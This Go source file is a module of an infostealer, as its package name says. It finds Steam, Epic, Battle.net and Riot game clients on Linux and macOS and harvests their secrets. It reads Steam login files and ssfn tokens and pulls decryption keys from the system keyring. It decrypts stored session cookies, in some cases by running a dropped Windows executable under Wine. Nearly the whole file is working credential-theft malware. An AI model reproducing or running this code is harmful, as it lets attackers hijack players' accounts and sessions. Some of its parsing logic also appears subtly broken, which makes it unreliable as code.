//go:build linux || darwin

package infostealer

import (
	"bufio"
	"bytes"
	"database/sql"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/andygrunwald/vdf"
	"github.com/zalando/go-keyring"
	"gopkg.in/yaml.v3"
	_ "modernc.org/sqlite"
)

var (
	lutrisPathLinux = filepath.Join("drive_c", "users", os.Getenv("USER"))
)

//go:embed cryptunprotectwine.exe
var cryptunprotectexe []byte

type supportedGamingPlatform struct {
	Name string
	Path string
	Type string
}

type localState struct {
	OsCrypt struct {
		EncryptedKey string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

type supportedGamingPlatforms []supportedGamingPlatform

var supportedGamingPlatformsLinux = supportedGamingPlatforms{
	{"Steam", filepath.Join(home, ".local", "share", "Steam"), "native"},
	{"Steam (flatpak)", filepath.Join(home, ".var", "app", "com.valvesoftware.Steam", ".local", "share", "steam"), "native"},
	{"Epic Games (heroic)", filepath.Join(home, ".config", "heroic"), "native"},
	{"Epic Games (lutris)", filepath.Join(home, "Games", "epic-games-store", lutrisPathLinux, "Local Settings", "Application Data", "EpicGamesLauncher", "Saved"), "wrapped"},
	{"Battle.net (lutris)", filepath.Join(home, "Games", "battlenet", lutrisPathLinux, "AppData", "Roaming", "Battle.net"), "Wrapped"},
	{"Riot Games (lutris)", filepath.Join(home, "Games", "riot-games", lutrisPathLinux, "Local Settings", "Application Data", "Riot Games", "Riot Client", "Data"), "Wrapped"},
}

var supportedGamingPlatformsMac = supportedGamingPlatforms{
	{"Steam", filepath.Join(appSupport, "Steam"), "native"},
	{"Epic Games", filepath.Join(appSupport, "Epic", "EpicGamesLauncher"), "native"},
	{"Battle.net", filepath.Join(appSupport, "Battle.net"), "native"},
	{"Riot Games", filepath.Join(appSupport, "Riot Games"), "native"},
}

func cryptUnprotectWine(encrypted []byte, localpath string) []byte { //wine cryptunprotect data
	_, err := os.Stat(filepath.Join(os.TempDir(), "dQw4w9WgXcQ.exe")) //only hardcoded the exe name because i cant just make a new file every single action
	if err != nil {
		os.WriteFile(filepath.Join(os.TempDir(), "dQw4w9WgXcQ.exe"), cryptunprotectexe, 0755)
	}

	encoded := base64.StdEncoding.EncodeToString(encrypted)

	cmd := exec.Command("wine", filepath.Join(os.TempDir(), "dQw4w9WgXcQ.exe"), encoded)
	cmd.Env = append(os.Environ(), "WINEPREFIX="+localpath, "WINEDEBUG=-all")
	out, _ := cmd.Output()
	outstr := strings.TrimSpace(string(out))

	if outstr == "failed" {
		return nil
	} else {
		decoded, _ := base64.StdEncoding.DecodeString(outstr)
		return decoded
	}
}

func getSupportedGamingPlatforms() supportedGamingPlatforms {
	switch runtime.GOOS {
	case "linux":
		return supportedGamingPlatformsLinux
	case "darwin":
		return supportedGamingPlatformsMac
	default:
		return nil
	}
}

func stealGamingCookies(dbpath string, key []byte) []cookie {
	fmt.Printf("[DEBUG] Starting stealGamingCookies for path: %s\n", dbpath)
	file, err := os.ReadFile(dbpath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read cookie DB: %v\n", err)
		return nil
	}

	filename := filepath.Join(os.TempDir(), randomstring(10))
	err = os.WriteFile(filename, file, 0600)
	if err != nil {
		fmt.Printf("[ERROR] Failed to write temp cookie file: %v\n", err)
		return nil
	}
	fmt.Printf("[DEBUG] Created temp DB at: %s\n", filename)

	db, err := sql.Open("sqlite", "file:"+filename+"?mode=ro")
	if err != nil {
		fmt.Printf("[ERROR] Failed to open sqlite DB: %v\n", err)
		return nil
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
	if err != nil {
		fmt.Printf("[ERROR] Query failed: %v\n", err)
		return nil
	}
	defer rows.Close()

	var cookies []cookie
	for rows.Next() {
		var (
			domain         string
			name           string
			encryptedvalue []byte
		)
		err = rows.Scan(&domain, &name, &encryptedvalue)
		if err != nil {
			fmt.Printf("[ERROR] Row scan failed: %v\n", err)
			continue
		}

		var plaintext string
		switch true {
		case bytes.HasPrefix(encryptedvalue, []byte("v11")):
			plaintext = decryptV11(encryptedvalue, key)
		case bytes.HasPrefix(encryptedvalue, []byte("v10")), bytes.HasPrefix(encryptedvalue, []byte("v20")):
			plaintext = decryptGCM(encryptedvalue, key)
		}

		cookies = append(cookies, cookie{
			Domain: domain,
			Name:   name,
			Value:  plaintext,
		})
	}
	fmt.Printf("[DEBUG] Successfully recovered %d cookies\n", len(cookies))
	os.Remove(filename)
	return cookies
}

type steamuser struct {
	UserID      string
	AccountName string
	DisplayName string
	SSFNCheck   string
}

type SSFNFile struct {
	File     []byte
	Filename string
}

type steam struct {
	Users   []steamuser
	SSFNs   []SSFNFile
	FullVDF []byte
}

type epic struct {
	Cookies []cookie
}

type battlenetJson struct {
	Client struct {
		Email     string `json:"SavedAccountEmail"`
		Region    string `json:"LastLoginRegion"`
		AutoLogin string `json:"AutoLogin"`
	} `json:"Client"`
}

type battlenet struct {
	Cookies    []cookie
	Key        []byte
	ClientInfo battlenetJson
}

type riotYaml struct {
	Client struct {
		SessionID string `yaml:"session_id"`
	} `yaml:"Client"`

	Install struct {
		Region string `yaml:"region"`
	} `yaml:"Install"`

	Login struct {
		SavedLogin bool `yaml:"remember_me"`
	} `yaml:"Login"`
}

type riotYamlWindows struct {
	Install struct {
		Globals struct {
			Region string `yaml:"region"`
		} `yaml:"globals"`

		OsCrypt struct {
			EncryptedKey string `yaml:"encrypted_key"`
		} `yaml:"os_crypt"`

		Login struct {
			Username string `yaml:"username"`
		} `yaml:"riot-login"`
	} `yaml:"install"`
}

type riot struct {
	Cookies     []cookie
	Data        riotYaml
	DataWindows riotYamlWindows
	Key         []byte
}

type gamingPlatform struct {
	Name          string
	Localpath     string
	Type          string
	SteamData     steam
	EpicData      epic
	BattleNetData battlenet
	RiotData      riot
}

func (platform *gamingPlatform) getSteam() {
	fmt.Printf("[DEBUG] Entering getSteam for path: %s\n", platform.Localpath)
	vdfPath := filepath.Join(platform.Localpath, "config", "loginusers.vdf")
	f, err := os.Open(vdfPath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to open Steam VDF: %v\n", err)
	} else {
		platform.SteamData.FullVDF, err = os.ReadFile(vdfPath)
		parser := vdf.NewParser(f)
		vdfFile, err := parser.Parse()
		if err != nil || vdfFile != nil {
			fmt.Printf("[ERROR] VDF Parse failed: %v\n", err)
			return
		} else {
			if userdata, ok := vdfFile["users"].(map[string]interface{}); ok {
				for id, data := range userdata {
					if info, ok := data.(map[string]interface{}); ok {
						user := steamuser{
							UserID:      id,
							AccountName: info["AccountName"].(string),
							DisplayName: info["PersonaName"].(string),
							SSFNCheck:   info["RememberPassword"].(string),
						}
						platform.SteamData.Users = append(platform.SteamData.Users, user)
						fmt.Printf("[DEBUG] Found Steam User: %s\n", user.AccountName)
					}
				}
			}
		}
		f.Close()
	}

	files, err := os.ReadDir(platform.Localpath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Steam dir: %v\n", err)
		return
	}
	for _, file := range files {
		name := file.Name()
		if !file.IsDir() && len(name) > 4 && name[:4] == "ssfn" {
			ssfnPath := filepath.Join(platform.Localpath, name)
			ssfn, err := os.ReadFile(ssfnPath)
			if err != nil {
				fmt.Printf("[ERROR] Failed to read SSFN %s: %v\n", name, err)
				continue
			}
			platform.SteamData.SSFNs = append(platform.SteamData.SSFNs, SSFNFile{
				File:     ssfn,
				Filename: name,
			})
			fmt.Printf("[DEBUG] Found SSFN File: %s\n", name)
		}
	}
}

func (platform *gamingPlatform) getEpic() {
	fmt.Printf("[DEBUG] Entering getEpic for path: %s\n", platform.Localpath)

	var key []byte
	if strings.Contains(platform.Name, "heroic") {
		keyringkey, _ := keyring.Get("Heroic Safe Storage", "Heroic")
		key = []byte(keyringkey)
	} else {
		keyringkey, _ := keyring.Get("Epic Safe Storage", "Epic Games")
		key = []byte(keyringkey)
	}
	platform.EpicData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "Session Storage", "Cookies"), key)
}

func (platform *gamingPlatform) getBattlenet() {
	cmd := exec.Command("sh", "-c", `security find-generic-password -s "com.blizzard.trestle" | grep "acct"`)
	out, _ := cmd.Output()

	scanner := bufio.NewScanner(strings.NewReader(string(out)))
	var acctid string
	for scanner.Scan() {
		_, newstring, found := strings.Cut(scanner.Text(), "=")
		if found == false {
			continue
		}
		acctid = strings.TrimSpace(strings.Trim(newstring, "\""))
	}

	key, _ := keyring.Get("com.blizzard.trestle", acctid)
	platform.BattleNetData.Key = []byte(key)
	platform.BattleNetData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "Cookies"), []byte(key))

	configPath := filepath.Join(platform.Localpath, "Battle.net.config")
	config, err := os.ReadFile(configPath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Bnet config: %v\n", err)
	} else {
		var configjson battlenetJson
		err = json.Unmarshal(config, &configjson)
		if err != nil {
			fmt.Printf("[ERROR] Bnet config JSON parse failed: %v\n", err)
		}
		platform.BattleNetData.ClientInfo = configjson
		fmt.Printf("[DEBUG] Bnet Email: %s\n", configjson.Client.Email)
	}
}

func (platform *gamingPlatform) getRiot() {
	fmt.Printf("[DEBUG] Entering getRiot for path: %s\n", platform.Localpath)
	yamlPath := filepath.Join(platform.Localpath, "RiotClientPrivateSettings.yaml")
	file, err := os.ReadFile(yamlPath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Riot YAML: %v\n", err)
		return
	}
	yaml.Unmarshal(file, &platform.RiotData.Data)

	cmd := exec.Command("sh", "-c", `security find-generic-password -s "riot_client" | grep "acct"`)
	out, _ := cmd.Output()

	scanner := bufio.NewScanner(strings.NewReader(string(out)))
	var acctid string
	for scanner.Scan() {
		_, newstring, found := strings.Cut(scanner.Text(), "=")
		if found == false {
			continue
		}
		acctid = strings.TrimSpace(strings.Trim(newstring, "\""))
	}
	key, _ := keyring.Get("riot_client", acctid)

	platform.RiotData.Key = []byte(key)
	platform.RiotData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "Session Storage", "Cookies"), []byte(key))
}

//wrapped stuff

func (platform *gamingPlatform) getEpicWrapped() {
	fmt.Printf("[DEBUG] Entering getEpic for path: %s\n", platform.Localpath)
	files, err := os.ReadDir(platform.Localpath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Epic dir: %v\n", err)
		return
	}
	var localstatepath string
	for _, file := range files {
		if file.IsDir() && len(file.Name()) > 8 && file.Name()[:8] == "webcache" {
			localstatepath = filepath.Join(platform.Localpath, file.Name(), "Local State")
			fmt.Printf("[DEBUG] Found Epic Local State at: %s\n", localstatepath)
			break
		}
	}
	statefile, err := os.ReadFile(localstatepath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Epic state file: %v\n", err)
		return
	}
	var state localState
	err = json.Unmarshal(statefile, &state)
	if err != nil {
		fmt.Printf("[ERROR] Epic JSON unmarshal failed: %v\n", err)
		return
	}

	newstring := strings.TrimPrefix(string(state.OsCrypt.EncryptedKey), "DPAPI")
	decoded, err := base64.StdEncoding.DecodeString(newstring)
	var key []byte
	if bytes.HasPrefix(decoded, []byte{0x01, 0x00, 0x00, 0x00}) {
		key = cryptUnprotectWine(decoded, filepath.Join(home, "Games", "epic-games-store"))
	} else {
		key = decoded
	}

	platform.EpicData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "Session Storage", "Cookies"), key)
}

func (platform *gamingPlatform) getBattlenetWrapped() {
	fmt.Printf("[DEBUG] Entering getBattlenet for path: %s\n", platform.Localpath)
	file, err := os.ReadFile(filepath.Join(platform.Localpath, "Local State"))
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Bnet state: %v\n", err)
		return
	}
	var state localState
	err = json.Unmarshal(file, &state)

	newstring := strings.TrimPrefix(string(state.OsCrypt.EncryptedKey), "DPAPI")
	decoded, err := base64.StdEncoding.DecodeString(newstring)
	var key []byte
	if bytes.HasPrefix(decoded, []byte{0x01, 0x00, 0x00, 0x00}) {
		key = cryptUnprotectWine(decoded, filepath.Join(home, "Games", "battlenet"))
	} else {
		key = decoded
	}

	platform.BattleNetData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "Session Storage", "Cookies"), key)

	configPath := filepath.Join(platform.Localpath, "Battle.net.config")
	config, err := os.ReadFile(configPath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Bnet config: %v\n", err)
	} else {
		var configjson battlenetJson
		err = json.Unmarshal(config, &configjson)
		if err != nil {
			fmt.Printf("[ERROR] Bnet config JSON parse failed: %v\n", err)
		}
		platform.BattleNetData.ClientInfo = configjson
		fmt.Printf("[DEBUG] Bnet Email: %s\n", configjson.Client.Email)
	}
}

func (platform *gamingPlatform) getRiotWrapped() {
	fmt.Printf("[DEBUG] Entering getRiot for path: %s\n", platform.Localpath)
	yamlPath := filepath.Join(platform.Localpath, "RiotClientPrivateSettings.yaml")
	file, err := os.ReadFile(yamlPath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Riot YAML: %v\n", err)
		return
	}
	err = yaml.Unmarshal(file, &platform.RiotData.DataWindows)
	if err != nil {
		fmt.Printf("[ERROR] Riot YAML unmarshal failed: %v\n", err)
		return
	}

	newstring := strings.TrimPrefix(string(platform.RiotData.DataWindows.Install.OsCrypt.EncryptedKey), "DPAPI")
	decoded, err := base64.StdEncoding.DecodeString(newstring)
	var key []byte
	if bytes.HasPrefix(decoded, []byte{0x01, 0x00, 0x00, 0x00}) {
		key = cryptUnprotectWine(decoded, filepath.Join(home, "Games", "riot-games"))
	} else {
		key = decoded
	}
	platform.RiotData.Key = key

	platform.RiotData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "Session Storage", "Cookies"), key)
}

type GamingPlatforms []gamingPlatform

func (supportedPlatforms *supportedGamingPlatforms) detectPlatforms() GamingPlatforms {
	var platforms GamingPlatforms
	for _, platform := range *supportedPlatforms {
		_, err := os.Stat(platform.Path)
		if err == nil {
			platforms = append(platforms, gamingPlatform{
				Name:      platform.Name,
				Localpath: platform.Path,
				Type:      platform.Type,
			})
		}
	}
	return platforms
}

func (platforms *GamingPlatforms) populate() {
	for i, platform := range *platforms {
		if strings.Contains(platform.Name, "lutris") {
			switch true {
			case strings.Contains(platform.Name, "Epic Games"):
				(*platforms)[i].getEpicWrapped()
			case strings.Contains(platform.Name, "Battle.net"):
				(*platforms)[i].getBattlenetWrapped()
			case strings.Contains(platform.Name, "Riot Games"):
				(*platforms)[i].getRiotWrapped()
			}
		} else {
			switch true {
			case strings.Contains(platform.Name, "Steam"):
				(*platforms)[i].getSteam()
			case strings.Contains(platform.Name, "Epic Games"):
				(*platforms)[i].getEpic()
			case platform.Name == "Battle.net":
				(*platforms)[i].getBattlenet()
			case platform.Name == "Riot Games":
				(*platforms)[i].getRiot()
			}
		}
	}
}

func Gaming() GamingPlatforms {
	supportedplatforms := getSupportedGamingPlatforms()
	platforms := supportedplatforms.detectPlatforms()
	platforms.populate()
	return platforms
}
